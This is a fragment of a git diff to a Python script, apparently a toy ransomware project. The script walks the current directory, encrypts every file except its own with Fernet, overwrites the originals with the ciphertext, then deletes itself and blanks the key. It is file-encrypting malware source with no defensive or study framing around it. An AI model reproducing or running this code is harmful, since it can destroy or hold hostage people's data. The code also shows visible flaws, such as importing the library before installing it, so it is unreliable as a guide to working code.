@@ -4,7 +4,6 @@ import sys
 import subprocess
 from cryptography.fernet import Fernet
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
-os.remove("keyfile")
 files = []
 for file in os.listdir():
     if file == "run.py" or file == "decrypt.py" or file == "keyfile" or file == ".gitattributes":
@@ -21,9 +20,5 @@ for file in files:
         with open(file, "wb") as filecontent:
             filecontent.write(enc_content)
 #selfdestruction of run.py
-with open("run.py", "rb") as runpy:
-    content = runpy.read()
-enc_content = Fernet(key).encrypt(content)
+os.remove("run.py")
 key = ""
-with open("run.py", "wb"):
-    runpy.write(enc_content)
